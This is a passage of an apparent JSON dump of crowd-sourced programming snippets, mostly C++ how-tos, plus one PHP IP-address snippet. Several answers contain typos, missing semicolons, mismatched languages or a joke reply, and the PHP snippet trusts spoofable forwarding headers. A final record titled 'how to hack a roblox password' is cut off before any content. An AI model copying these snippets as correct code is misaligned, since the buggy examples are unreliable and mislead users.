    "description": "#include <bits/stdc++.h>  using namespace std;  //Display elements of the array void display(vector<int> a, int n){     for(int i=0;i<n;i++) cout << a[i] << \" \";     cout << endl; }  int main() {     //Obtaining length of array     int n;     cin >> n;      //Declaring a vector of integers     vector<int> a(n);          //Taking input of array of integers     for(int i=0; i<n; i++){         cin >> a[i];     }      do{         //Display the current permutation         display(a, n);     }while(next_permutation(a.begin(), a.end())); //Generate next permutation till it is not lexicographically largest      return 0; } C++Copy\n",
    "reg_date": "2021-10-12T11:40:55.000Z"
  },
  {
    "id": 2432,
    "keyword": null,
    "link": null,
    "title": " how to find data size in c++",
    "description": "cout << \"Size of char: \" << sizeof(variable) << \" byte(s)\" << endl;\n",
    "reg_date": "2021-10-12T11:40:55.000Z"
  },
  {
    "id": 2433,
    "keyword": null,
    "link": null,
    "title": " how to find element in unorder map c++",
    "description": "// unordered_map::find #include <iostream> #include <string> #include <unordered_map>  int main () {   std::unordered_map<std::string,double> mymap = {      {\"mom\",5.4},      {\"dad\",6.1},      {\"bro\",5.9} };    std::string input;   std::cout << \"who? \";   getline (std::cin,input);    std::unordered_map<std::string,double>::const_iterator got = mymap.find (input);    if ( got == mymap.end() )     std::cout << \"not found\";   else     std::cout << got->first << \" is \" << got->second;    std::cout << std::endl;    return 0; }\n",
    "reg_date": "2021-10-12T11:40:55.000Z"
  },
  {
    "id": 2434,
    "keyword": null,
    "link": null,
    "title": " how to find hcf in c++",
    "description": "// C++ program to find GCD of two numbers  #include <iostream>  using namespace std;  // Recursive function to return gcd of a and b  int gcd(int a, int b)  {  \tif (b == 0)  \t\treturn a;  \treturn gcd(b, a % b);  \t }   // Driver program to test above function  int main()  {  \tint a = 98, b = 56;  \tcout<<\"GCD of \"<<a<<\" and \"<<b<<\" is \"<<gcd(a, b);  \treturn 0;  }  \n",
    "reg_date": "2021-10-12T11:40:55.000Z"
  },
  {
    "id": 2435,
    "keyword": null,
    "link": null,
    "title": " how to find if a number is possitive or negative in c++",
    "description": "#include<iostream>  using namespace std;  int main ()  {      int num;      cout << \"Enter the number to be checked : \";      cin >> num;      if (num >= 0)          cout << num << \" is a positive number.\";      else           cout << num << \" is a negative number.\";      return 0;  }\n",
    "reg_date": "2021-10-12T11:40:55.000Z"
  },
  {
    "id": 2436,
    "keyword": null,
    "link": null,
    "title": " how to find last character of string in c++",
    "description": "auto find_char = 'a' size_t last_occurence_index = str.find_last_of(find_char);\nString[strlen(String) - 1]; \n",
    "reg_date": "2021-10-12T11:40:55.000Z"
  },
  {
    "id": 2437,
    "keyword": null,
    "link": null,
    "title": " how to find length of character array in c++",
    "description": "char* example = \"Lorem ipsum dolor sit amet\"; int length = strlen(example); std::cout << length << '\\n'; // 26\n#include <iostream>  using namespace std;  int main() {     char arr[] = \"grepper\";     cout << sizeof(arr) << endl;     return 0;     //    keep it in mind that character arrays have length of one more than your characters because last one is for \\0 to show that word has ended } \nInstead of sizeof() for finding the length of strings or character  arrays, just use strlen(string_name) with the header file #include <cstring>    it's easier.\n",
    "reg_date": "2021-10-12T11:40:56.000Z"
  },
  {
    "id": 2438,
    "keyword": null,
    "link": null,
    "title": " how to find out the handler of a console window c++",
    "description": "HWND GetConsoleHwnd(void)    {        #define MY_BUFSIZE 1024 // Buffer size for console window titles.        HWND hwndFound;         // This is what is returned to the caller.        char pszNewWindowTitle[MY_BUFSIZE]; // Contains fabricated                                            // WindowTitle.        char pszOldWindowTitle[MY_BUFSIZE]; // Contains original                                            // WindowTitle.         // Fetch current window title.         GetConsoleTitle(pszOldWindowTitle, MY_BUFSIZE);         // Format a \"unique\" NewWindowTitle.         wsprintf(pszNewWindowTitle,\"%d/%d\",                    GetTickCount(),                    GetCurrentProcessId());         // Change current window title.         SetConsoleTitle(pszNewWindowTitle);         // Ensure window title has been updated.         Sleep(40);         // Look for NewWindowTitle.         hwndFound=FindWindow(NULL, pszNewWindowTitle);         // Restore original window title.         SetConsoleTitle(pszOldWindowTitle);         return(hwndFound);    } \n",
    "reg_date": "2021-10-12T11:40:56.000Z"
  },
  {
    "id": 2439,
    "keyword": null,
    "link": null,
    "title": " how to find product of a given numbers in c++",
    "description": "#include<iostream>  using namespace std;  int main() { \tint number, reminder, digitProduct = 1; \t \tcout << \"\\nPlease Enter the Number to find the Digits Product =  \"; \tcin >> number; \t \twhile (number > 0) \t{     \treminder = number % 10;     \tdigitProduct = digitProduct * reminder;     \tnumber = number / 10;     \t     \tcout << \"\\nDigit = \" << reminder << \" and the Digit Product = \" << digitProduct; \t} \tcout << \"\\n\\nThe Product of all Digits in a given Number = \" << digitProduct; \t\t  \treturn 0; }\n",
    "reg_date": "2021-10-12T11:40:56.000Z"
  },
  {
    "id": 2440,
    "keyword": null,
    "link": null,
    "title": " how to find quotient and remainder in c++",
    "description": "#include <iostream>  using namespace std;  int main() {     int divisor, dividend, quotient, remainder;      cout<< \"Enter dividend: \";     cin>> dividend;      cout<< \"divisor: \";     cin>> divisor;      quotient = dividend / divisor;     remainder = dividend % divisor;          cout<< \"Value of quiotent: \"<< quotient<< endl;           cout<< \"Value of remainder: \"<<remainder<<endl;           return 0; }\n",
    "reg_date": "2021-10-12T11:40:56.000Z"
  },
  {
    "id": 2441,
    "keyword": null,
    "link": null,
    "title": " how to find something in a string in c++",
    "description": "const char* c = \"Word\"; string str = \"WhereIsMyWordThatINeed\"; cout << \"the word is at index \" << str.find(c); //this will print \"the word is at index 9\"\n#include <iostream> #include <string> #include <algorithm> #include <functional>  int main() {     std::string in = \"Lorem ipsum dolor sit amet, consectetur adipiscing elit,\"                      \" sed do eiusmod tempor incididunt ut labore et dolore magna aliqua\";     std::string needle = \"pisci\";     auto it = std::search(in.begin(), in.end(),                    std::boyer_moore_searcher(                        needle.begin(), needle.end()));     if(it != in.end())         std::cout << \"The string \" << needle << \" found at offset \"                   << it - in.begin() << '\\n';     else         std::cout << \"The string \" << needle << \" not found\\n\"; }\nIf not found then returns npos or -1 in int\n",
    "reg_date": "2021-10-12T11:40:56.000Z"
  },
  {
    "id": 2442,
    "keyword": null,
    "link": null,
    "title": " how to find sum of values on path in atree",
    "description": "#include <bits/stdc++.h> #define FOR(i, x, y) for (int i = x; i < y; i++) typedef long long ll; using namespace std;  int n, m;  vector<int> graph[100001]; int timer = 1, tin[100001], tout[100001]; int anc[100001][18];  void dfs(int node = 1, int parent = 0) {     anc[node][0] = parent;     for (int i = 1; i < 18 && anc[node][i - 1]; i++)         anc[node][i] = anc[anc[node][i - 1]][i - 1];      tin[node] = timer++;     for (int i : graph[node]) if (i != parent) dfs(i, node);     tout[node] = timer; }  int bit[100001];  void update(int pos, int val) { for (; pos <= n; pos += (pos & (-pos))) bit[pos] += val; }  int query(int pos) {     int ans = 0;     for (; pos; pos -= (pos & (-pos))) ans += bit[pos];     return ans; }  int find_ancestor(int node) {     int lca = node;     for (int i = 17; ~i; i--) {         if (anc[lca][i] && query(tin[anc[lca][i]]) == query(tin[node])) lca = anc[lca][i];     }     return lca; }  int main() {     ios_base::sync_with_stdio(0);     cin.tie(0);     freopen(\"disconnect.in\", \"r\", stdin);     freopen(\"disconnect.out\", \"w\", stdout);     cin >> n >> m;     FOR(i, 1, n) {         int a, b;         cin >> a >> b;         graph[a].push_back(b);         graph[b].push_back(a);     }     dfs();      int v = 0;     while (m--) {         int t, x, y;         cin >> t >> x >> y;         int a = x ^ v, b = y ^ v;          if (t == 1) {             if (anc[b][0] == a) swap(a, b);             update(tin[a], 1);             update(tout[a], -1);         } else {             if (find_ancestor(a) == find_ancestor(b)) {                 cout << \"YES\\n\";                 v = a;             } else {                 cout << \"NO\\n\";                 v = b;             }         }     }     return 0; } \n",
    "reg_date": "2021-10-12T11:40:56.000Z"
  },
  {
    "id": 2443,
    "keyword": null,
    "link": null,
    "title": " how to find the left most bit 1 in binary of any number",
    "description": "//C++ Code to find the value of 2^n = highestOneBit().  int highestOneBit(int i) {     i |= (i >>  1);     i |= (i >>  2);     i |= (i >>  4);     i |= (i >>  8);     i |= (i >> 16);     return i - (i >> 1); }\n",
    "reg_date": "2021-10-12T11:40:56.000Z"
  },
  {
    "id": 2444,
    "keyword": null,
    "link": null,
    "title": " how to find the length of an string in c++",
    "description": "str.length();\n#include<iostream> #include<cstring> using namespace std; main() {    string myStr = \"This is a sample string\";    char myStrChar[] = \"This is a sample string\";    cout << \"String length using string::length() function: \" << myStr.length() <<endl;    cout << \"String length using string::size() function: \" << myStr.size() <<endl;    cout << \"String length using strlen() function for c like string: \" << strlen(myStrChar) <<endl;    cout << \"String length using while loop: \";    char *ch = myStrChar;    int count = 0;    while(*ch != '\\0'){       count++;       ch++;    }    cout << count << endl;    cout << \"String length using for loop: \";    count = 0;    for(int i = 0; myStrChar[i] != '\\0'; i++){       count++;    }    cout << count; }\n",
    "reg_date": "2021-10-12T11:40:56.000Z"
  },
  {
    "id": 2445,
    "keyword": null,
    "link": null,
    "title": " how to find the max b=etween 3number in cpp",
    "description": "#include <iostream> using namespace std;  int main() {         float n1, n2, n3;      cout << \"Enter three numbers: \";     cin >> n1 >> n2 >> n3;      if(n1 >= n2 && n1 >= n3)         cout << \"Largest number: \" << n1;      if(n2 >= n1 && n2 >= n3)         cout << \"Largest number: \" << n2;          if(n3 >= n1 && n3 >= n2)         cout << \"Largest number: \" << n3;        return 0; }\n",
    "reg_date": "2021-10-12T11:40:56.000Z"
  },
  {
    "id": 2446,
    "keyword": null,
    "link": null,
    "title": " how to find the mode of a vector c++",
    "description": "//copied from GeeksForGeeks #include <bits/stdc++.h>  using namespace std;     // Function that sort input array a[] and  // calculate mode and median using counting  // sort.  void printMode(int a[], int n)  {       int b[n];      int max = *max_element(a, a + n);      int t = max + 1;      int count[t];      for (int i = 0; i < t; i++)          count[i] = 0;      for (int i = 0; i < n; i++)          count[a[i]]++;      int mode = 0;      int k = count[0];      for (int i = 1; i < t; i++) {          if (count[i] > k) {              k = count[i];              mode = i;          }      }         cout << \"mode = \" << mode;  }  //Just Include this in your template and call the function printMode  //to print the mode\n",
    "reg_date": "2021-10-12T11:40:56.000Z"
  },
  {
    "id": 2447,
    "keyword": null,
    "link": null,
    "title": " how to find the size of a character array in c++",
    "description": "char* example = \"Lorem ipsum dolor sit amet\"; int length = strlen(example); std::cout << length << '\\n'; // 26\nInstead of sizeof() for finding the length of strings or character  arrays, just use strlen(string_name) with the header file #include <cstring>    it's easier.\n",
    "reg_date": "2021-10-12T11:40:57.000Z"
  },
  {
    "id": 2448,
    "keyword": null,
    "link": null,
    "title": " how to find typein c++",
    "description": "#include <typeinfo> ... cout << typeid(variable).name() << endl; \n",
    "reg_date": "2021-10-12T11:40:57.000Z"
  },
  {
    "id": 2449,
    "keyword": null,
    "link": null,
    "title": " how to find vowal and consonent of a string in c++",
    "description": "#include <iostream> using namespace std;  int main() {     char line[150];     int vowels, consonants, digits, spaces;      vowels =  consonants = digits = spaces = 0;      cout << \"Enter a line of string: \";     cin.getline(line, 150);     for(int i = 0; line[i]!='\\0'; ++i)     {         if(line[i]=='a' || line[i]=='e' || line[i]=='i' ||            line[i]=='o' || line[i]=='u' || line[i]=='A' ||            line[i]=='E' || line[i]=='I' || line[i]=='O' ||            line[i]=='U')         {             ++vowels;         }         else if((line[i]>='a'&& line[i]<='z') || (line[i]>='A'&& line[i]<='Z'))         {             ++consonants;         }         else if(line[i]>='0' && line[i]<='9')         {             ++digits;         }         else if (line[i]==' ')         {             ++spaces;         }     }      cout << \"Vowels: \" << vowels << endl;     cout << \"Consonants: \" << consonants << endl;     cout << \"Digits: \" << digits << endl;     cout << \"White spaces: \" << spaces << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:40:57.000Z"
  },
  {
    "id": 2450,
    "keyword": null,
    "link": null,
    "title": " how to fix class friendship errors in c++",
    "description": "lololol\n",
    "reg_date": "2021-10-12T11:40:57.000Z"
  },
  {
    "id": 2451,
    "keyword": null,
    "link": null,
    "title": " how to format big numbers with commas in c++",
    "description": "#include <iomanip> #include <locale>  template<class T> std::string FormatWithCommas(T value) {     std::stringstream ss;     ss.imbue(std::locale(\"\"));     ss << std::fixed << value;     return ss.str(); } \n",
    "reg_date": "2021-10-12T11:40:57.000Z"
  },
  {
    "id": 2452,
    "keyword": null,
    "link": null,
    "title": " how to format decimal palces in c++",
    "description": "std::cout << std::setprecision(2) << std::fixed; // where the 2 is how many decimal places you want // note you need to <iomanip>\n",
    "reg_date": "2021-10-12T11:40:57.000Z"
  },
  {
    "id": 2453,
    "keyword": null,
    "link": null,
    "title": " how to get PID by name in c++",
    "description": "#include <Windows.h> #include <iostream> #include <Tlhelp32.h> #include <comdef.h>  /*snapshot for all running processes*/ \tHANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL); \tPROCESSENTRY32 pEntry; \t/*initializing size - needed for using Process32First*/ \tpEntry.dwSize = sizeof(pEntry); \tBOOL hRes = Process32First(hSnapShot, &pEntry); \t/*while first process in pEntry exists*/ \twhile (hRes) \t{ \t\t/*create const char for string comparison*/ \t\t_bstr_t b(pEntry.szExeFile); \t\tif (strcmp(b, \"process name\") == 0) \t\t{ \t\t\tstd::cout << (DWORD)pEntry.th32ProcessID; \t\t\tbreak; \t\t} \t\thRes = Process32Next(hSnapShot, &pEntry); \t} }\n",
    "reg_date": "2021-10-12T11:40:57.000Z"
  },
  {
    "id": 2454,
    "keyword": null,
    "link": null,
    "title": " how to get PID by process name c++",
    "description": "#include <Windows.h> #include <iostream> #include <Tlhelp32.h> #include <comdef.h>  /*snapshot for all running processes*/ HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL); PROCESSENTRY32 pEntry; /*initializing size - needed for using Process32First*/ pEntry.dwSize = sizeof(pEntry); BOOL hRes = Process32First(hSnapShot, &pEntry); /*while first process in pEntry exists*/ while (hRes) {   /*create const char for string comparison*/   _bstr_t b(pEntry.szExeFile);   if (strcmp(b, \"process name\") == 0)   {     std::cout << (DWORD)pEntry.th32ProcessID;     break;   }   hRes = Process32Next(hSnapShot, &pEntry); } \n",
    "reg_date": "2021-10-12T11:40:57.000Z"
  },
  {
    "id": 2455,
    "keyword": null,
    "link": null,
    "title": " how to get a letter from the user c++  string",
    "description": "string letters = \"ABC\"; char letterN = letters[0];\n",
    "reg_date": "2021-10-12T11:40:57.000Z"
  },
  {
    "id": 2456,
    "keyword": null,
    "link": null,
    "title": " how to get a letter from the users string in c++",
    "description": "string letters = \"ABC\"; char letterN = letters[0];\n",
    "reg_date": "2021-10-12T11:40:58.000Z"
  },
  {
    "id": 2457,
    "keyword": null,
    "link": null,
    "title": " how to get a random element from a vector c++ string",
    "description": "#include <iostream> #include <vector> using std::string;   int main() {   std::vector <string> some_vector {\"pizza\", \"burger\", \"fries\", \"chicken\"};       string random = some_vector[rand() % some_vector.size()];    std::cout << random << \"\\n\";         return 0; }\n",
    "reg_date": "2021-10-12T11:40:58.000Z"
  },
  {
    "id": 2458,
    "keyword": null,
    "link": null,
    "title": " how to get a random number between two numbers in c++",
    "description": "int randNum = rand()%(max-min + 1) + min; \n#inlcude <time.h>  int randNum = rand()%(max-min + 1) + min;\n",
    "reg_date": "2021-10-12T11:40:58.000Z"
  },
  {
    "id": 2459,
    "keyword": null,
    "link": null,
    "title": " how to get a section of a string in c++",
    "description": "// string::substr #include <iostream> #include <string> using namespace std;  int main () {   string str=\"We think in generalities, but we live in details.\";                              // quoting Alfred N. Whitehead   string str2, str3;   size_t pos;    str2 = str.substr (12,12); // \"generalities\"    pos = str.find(\"live\");    // position of \"live\" in str   str3 = str.substr (pos);   // get from \"live\" to the end    cout << str2 << ' ' << str3 << endl;    return 0; } \n",
    "reg_date": "2021-10-12T11:40:58.000Z"
  },
  {
    "id": 2460,
    "keyword": null,
    "link": null,
    "title": " how to get a word from file c++",
    "description": "void readFile() {     ifstream file;     file.open (\"program.txt\");     if (!file.is_open()) return;      string word;     while (file >> word)     {         cout<< word << '\\n';     } } \n",
    "reg_date": "2021-10-12T11:40:58.000Z"
  },
  {
    "id": 2461,
    "keyword": null,
    "link": null,
    "title": " how to get an element in a list c++",
    "description": "#include <list>  auto it = yourList.begin(); std::advance(it, index);  std::cout << *it; \n",
    "reg_date": "2021-10-12T11:40:58.000Z"
  },
  {
    "id": 2462,
    "keyword": null,
    "link": null,
    "title": " how to get c++ string length",
    "description": "   string txt = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; cout << \"The length of the txt    string is: \" << txt.length();     //Tip: You might see some C++ programs that use the size() function to get the length of a string. This is just an alias of length().  //It is completely up to you if you want to use length() or size():      string txt = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; cout << \"The length of the txt string is: \" << txt.size();\n",
    "reg_date": "2021-10-12T11:40:58.000Z"
  },
  {
    "id": 2463,
    "keyword": null,
    "link": null,
    "title": " how to get characters through their ascii value in c++",
    "description": "#include <iostream> using namespace std;  int main() { \tint var=65; \tcout<<(char)var<<endl; \treturn 0; } \n",
    "reg_date": "2021-10-12T11:40:58.000Z"
  },
  {
    "id": 2464,
    "keyword": null,
    "link": null,
    "title": " how to get double y dividing 2 integers in c++",
    "description": "int a {10}, b {3};            //output : 3.333 double c {}; c = static_cast<double>(a)/b; cout<<c;\n",
    "reg_date": "2021-10-12T11:40:58.000Z"
  },
  {
    "id": 2465,
    "keyword": null,
    "link": null,
    "title": " how to get euler constant in c++",
    "description": "#inclue <cmath> const double EulerConstant = std::exp(1.0);\n",
    "reg_date": "2021-10-12T11:40:58.000Z"
  },
  {
    "id": 2466,
    "keyword": null,
    "link": null,
    "title": " how to get input from the console in c++",
    "description": "// cin with strings #include <iostream> #include <string> using namespace std;  int main () {   string mystr;   cout << \"What's your name? \";   getline (cin, mystr);   cout << \"Hello \" << mystr << \".\\n\";   cout << \"What is your favorite team? \";   getline (cin, mystr);   cout << \"I like \" << mystr << \" too!\\n\";   return 0; }\nint age; cin >> age;\n",
    "reg_date": "2021-10-12T11:40:58.000Z"
  },
  {
    "id": 2467,
    "keyword": null,
    "link": null,
    "title": " how to get input in cpp",
    "description": "// i/o example  #include <iostream> using namespace std;  int main () {   int i;   cout << \"Please enter an integer value: \";   cin >> i;   cout << \"The value you entered is \" << i;   return 0; }\nint x;  cout << \"hurry, give me a number!: \"; // Type a number and press enter cin >> x; // Get user input from the keyboard cout << \"you picked: \" << x << \" !\" // Display the input value  OR use: getline >> (cin, variable-name); instead of  cin >> x;    \n",
    "reg_date": "2021-10-12T11:40:59.000Z"
  },
  {
    "id": 2468,
    "keyword": null,
    "link": null,
    "title": " how to get ipv4 address in php",
    "description": "The simplest way to collect the Client/Visitor IP address using PHP is the REMOTE_ADDR. Pass the 'REMOTE_ADDR' in PHP $_SERVER variable. It will return the IP address of the visitor who is currently viewing the webpage.  Get the IP address of the website <?php echo 'User IP Address : '. $_SERVER['REMOTE_ADDR']; ?>    /* I Hope it will help you. Namaste Stay Home Stay Safe */\n$_SERVER['REMOTE_ADDR']\nfunction getIp() {     $ip = $_SERVER['REMOTE_ADDR'];       if (!empty($_SERVER['HTTP_CLIENT_IP'])) {         $ip = $_SERVER['HTTP_CLIENT_IP'];     } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {         $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];     }       return $ip; }\n// Function to get the user IP address function getUserIP() {     $ipaddress = '';     if (isset($_SERVER['HTTP_CLIENT_IP']))         $ipaddress = $_SERVER['HTTP_CLIENT_IP'];     else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))         $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];     else if(isset($_SERVER['HTTP_X_FORWARDED']))         $ipaddress = $_SERVER['HTTP_X_FORWARDED'];     else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))         $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];     else if(isset($_SERVER['HTTP_FORWARDED_FOR']))         $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];     else if(isset($_SERVER['HTTP_FORWARDED']))         $ipaddress = $_SERVER['HTTP_FORWARDED'];     else if(isset($_SERVER['REMOTE_ADDR']))         $ipaddress = $_SERVER['REMOTE_ADDR'];     else         $ipaddress = 'UNKNOWN';     return $ipaddress; } \n",
    "reg_date": "2021-10-12T11:40:59.000Z"
  },
  {
    "id": 2469,
    "keyword": null,
    "link": null,
    "title": " how to get last element of set",
    "description": "set<int> s = {1,2,3} auto it = s.end(); it--; cout<<*it<<\"\\n\"; // This refers to last element of a set\n// Example program #include <iostream> #include <string> #include <set> #include <iterator> using namespace std; int main() {     set<int>a = {5,9,100,25,4,6};     auto it = a.end();     it--;     cout << *it; }\n",
    "reg_date": "2021-10-12T11:40:59.000Z"
  },
  {
    "id": 2470,
    "keyword": null,
    "link": null,
    "title": " how to get last element of set in c++",
    "description": "set<int> s = {1,2,3} auto it = s.end(); it--; cout<<*it<<\"\\n\"; // This refers to last element of a set\nconst nums = [1, 2, 3, 4, 5, 6, 7]; const lastOne = nums[nums.lenght - 1]; // last element of array\nlist.get(0);\n!list_or_set.isEmpty()\n",
    "reg_date": "2021-10-12T11:40:59.000Z"
  },
  {
    "id": 2471,
    "keyword": null,
    "link": null,
    "title": " how to get mouse position on window sfm;",
    "description": "sf::Vector2i position = sf::Mouse::getPosition(window);  // position will contain the x and y of your mouse  position.x >> 0 position.y >> 0\n",
    "reg_date": "2021-10-12T11:40:59.000Z"
  },
  {
    "id": 2472,
    "keyword": null,
    "link": null,
    "title": " how to get name of caller function c++",
    "description": "// we'll use __builtin_FUNCTION() to get the name of caller function  #include <iostream>  const char* return_caller(const char* caller = __builtin_FUNCTION()){ \treturn caller; }  void test(){ \tprintf(\"%s\\n\",return_caller()); }  int main(){   \ttest(); \tprintf(\"%s\\n\",return_caller()); }  // you can run it in: http://cpp.sh/7beb\n",
    "reg_date": "2021-10-12T11:40:59.000Z"
  },
  {
    "id": 2473,
    "keyword": null,
    "link": null,
    "title": " how to get os name in c++",
    "description": "#include <stdio.h>  #if defined(_WIN32) || defined(_WIN64)         const char* os = \"Windows\"; #else #ifdef __linux         const char* os = \"Linux\"; #else         const char* os = \"Unknown\"; #endif #endif  int main(void) {    printf(\"os = %s\\n\", os);    return 0; }\n",
    "reg_date": "2021-10-12T11:40:59.000Z"
  },
  {
    "id": 2474,
    "keyword": null,
    "link": null,
    "title": " how to get size of 2d vector in c++",
    "description": "// Create a vector containing n  //vectors of size m, all u=initialized with 0 vector<vector<int> > vec( n , vector<int> (m, 0));  \n// finding size of a square matrix myVector[0].size();\nmyVector[   Vector[0, 4, 2, 5],   Vector[1, 4, 2] ];  /*When you call for myVector[1].size() it would return 3 and [0] would return 4.  For the amount of rows (int vectors) in the 2d vector, you can just use myVector.size()  You can run this to see it in actions*/\n// Initializing 2D vector \"vect\" with  // values  vector<vector<int> > vect{ { 1, 2, 3 },                             { 4, 5, 6 },                             { 7, 8, 9 } }; \n",
    "reg_date": "2021-10-12T11:40:59.000Z"
  },
  {
    "id": 2475,
    "keyword": null,
    "link": null,
    "title": " how to get size of array c++",
    "description": "int arr[5]; int len = sizeof(arr) / sizeof(arr[0]); // returns 5\nint a[20]; int length; length = sizeof(a) / sizeof(int); \n#include <iostream> using namespace std; int main() {    int arr[5] = {4, 1, 8, 2, 9};    int len = sizeof(arr)/sizeof(arr[0]);    cout << \"The length of the array is: \" << len;    return 0; }\n#include <iostream> using namespace std;  #define size(type) ((char *)(&type+1)-(char*)(&type))  int main(){   int arr[5] = {1, 2, 3, 4, 5};   cout << size(arr) / size(arr[0]) << endl; //returns 5   //alternatively   cout << sizeof(arr) / sizeof(int) << endl; //returns 5 }\nint size = sizeof(arr)/sizeof(arr[0])\nHow do I find the length of an array? //Method 1: - use sizeof(arr)/sizeof(*arr)   //Method 2:  - use std::array from  C++11 array <int,6> arr{1, 2, 3, 4, 5, 6};  cout << arr.size(); \n",
    "reg_date": "2021-10-12T11:40:59.000Z"
  },
  {
    "id": 2476,
    "keyword": null,
    "link": null,
    "title": " how to get steam id c++",
    "description": "#include <steamid.hpp> ...  // parse a Steam ID in \"SteamID3\" format. SteamID steamid( \"[U:1:108998443]\", SteamID::Formats::STEAMID3 );  // print it in SteamID32 format std::cout << steamid[ SteamID::Formats::STEAMID32 ];  // (prints \"STEAM_1:1:54499221\") \n",
    "reg_date": "2021-10-12T11:41:00.000Z"
  },
  {
    "id": 2477,
    "keyword": null,
    "link": null,
    "title": " how to get string from user in cpp",
    "description": "   string firstName; cout << \"Type your first name: \";  cin >>    firstName;    // get user input from the keyboard cout << \"Your name is: \" <<    firstName;  // Type your first name: John // Your name is: John \n",
    "reg_date": "2021-10-12T11:41:00.000Z"
  },
  {
    "id": 2478,
    "keyword": null,
    "link": null,
    "title": " how to get string length in c++",
    "description": "// string::length #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   std::cout << \"The size of str is \" << str.length() << \" bytes.\\n\";   return 0; }\nstr.length();\n#include <iostream> #include <string>  int main() {   string str = \"iftee\";      //method 1: using length() function   int len = str.length();   cout << \"The String Length: \" << len << endl;      //method 2: using size() function   int len2 = str.size();   cout << \"The String Length: \" << len2 << endl;      return 0; }\n#include <string> #include <iostream>  int main() {     std::string s(21, '*');      std::cout << s << std::endl;      return 0; } \n   string txt = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; cout << \"The length of the txt    string is: \" << txt.length();     //Tip: You might see some C++ programs that use the size() function to get the length of a string. This is just an alias of length().  //It is completely up to you if you want to use length() or size():      string txt = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; cout << \"The length of the txt string is: \" << txt.size();\n#include <iostream> using namespace std; int main() {     string str = \"Viet Nam\";     cout << \"String Length = \" << str.size();   \t// you can also use str.length()     return 0; }\n",
    "reg_date": "2021-10-12T11:41:00.000Z"
  },
  {
    "id": 2479,
    "keyword": null,
    "link": null,
    "title": " how to get the largest number in a c++ array",
    "description": "#include <iostream> using namespace std; int main(){    //n is the number of elements in the array    int n, largest;    int num[50];    cout<<\"Enter number of elements you want to enter: \";    cin>>n;        /* Loop runs from o to n, in such a way that first     * element entered by user is stored in num[0], second      * in num[1] and so on.      */    for(int i = 0; i < n; i++) {       cout<<\"Enter Element \"<<(i+1)<< \": \";       cin>>num[i];    }    // Storing first array element in \"largest\" variable    largest = num[0];    for(int i = 1;i < n; i++) {       /* We are comparing largest variable with every element        * of array. If there is an element which is greater than        * largest variable value then we are copying that variable        * to largest, this way we have the largest element copied        * to the variable named \"largest\" at the end of the loop         *        */       if(largest < num[i])          largest = num[i];    }     cout<<\"Largest element in array is: \"<<largest;    return 0; }\n",
    "reg_date": "2021-10-12T11:41:00.000Z"
  },
  {
    "id": 2480,
    "keyword": null,
    "link": null,
    "title": " how to get the numbers in a vector c++ sfml",
    "description": "vector2f.x; vector2f.y;  // the vector2f being ur vector of course. :0\n",
    "reg_date": "2021-10-12T11:41:00.000Z"
  },
  {
    "id": 2481,
    "keyword": null,
    "link": null,
    "title": " how to get the player view point location and rotation in ue4 c++",
    "description": "#include \"GameFrameworks/PlayerController.h\"   void YourFunction(int32 yourargument)//note: The return type and the argument tupe is assumed. You can change it to whatever you want. { \tFVector PlayerViewPointLocation;   \tFRotator PlayerViewPointLocation;      \tAPlayerController::GetPlayerViewPoint(OUT PlayerViewPointLocation, OUT PlayerViewPointLocation); //Note: You can also use GetWorld()->GetPlayerController()->GetPlayerViewPointLocation() but you have to include the file given above.   \t } \n",
    "reg_date": "2021-10-12T11:41:00.000Z"
  },
  {
    "id": 2482,
    "keyword": null,
    "link": null,
    "title": " how to get the prime number in c++ where time complexity is 0(log n)",
    "description": "// C++ program to print all primes smaller than or equal to  // n using Sieve of Eratosthenes  #include <bits/stdc++.h>  using namespace std;   void SieveOfEratosthenes(int n)  {  \t// Create a boolean array \"prime[0..n]\" and initialize  \t// all entries it as true. A value in prime[i] will  \t// finally be false if i is Not a prime, else true.  \tbool prime[n+1];  \tmemset(prime, true, sizeof(prime));   \tfor (int p=2; p*p<=n; p++)  \t{  \t\t// If prime[p] is not changed, then it is a prime  \t\tif (prime[p] == true)  \t\t{  \t\t\t// Update all multiples of p greater than or  \t\t\t// equal to the square of it  \t\t\t// numbers which are multiple of p and are  \t\t\t// less than p^2 are already been marked.  \t\t\tfor (int i=p*p; i<=n; i += p)  \t\t\t\tprime[i] = false;  \t\t}  \t}   \t// Print all prime numbers  \tfor (int p=2; p<=n; p++)  \tif (prime[p])  \t\tcout << p << \" \";  }   // Driver Program to test above function  int main()  {  \tint n = 30;  \tcout << \"Following are the prime numbers smaller \" \t\t<< \" than or equal to \" << n << endl;  \tSieveOfEratosthenes(n);  \treturn 0;  }  \n",
    "reg_date": "2021-10-12T11:41:00.000Z"
  },
  {
    "id": 2483,
    "keyword": null,
    "link": null,
    "title": " how to get window size sfml",
    "description": "window.GetSize()  window.GetSize().x  window.GetSize().x\n",
    "reg_date": "2021-10-12T11:41:00.000Z"
  },
  {
    "id": 2484,
    "keyword": null,
    "link": null,
    "title": " how to grab all of user input c++",
    "description": "// cin with strings #include <iostream> #include <string> using namespace std;  int main () {   string mystr;   cout << \"What's your name? \";   getline (cin, mystr);   cout << \"Hello \" << mystr << \".\\n\";   cout << \"What is your favorite team? \";   getline (cin, mystr);   cout << \"I like \" << mystr << \" too!\\n\";   return 0; }\n",
    "reg_date": "2021-10-12T11:41:00.000Z"
  },
  {
    "id": 2485,
    "keyword": null,
    "link": null,
    "title": " how to hack a roblox password",
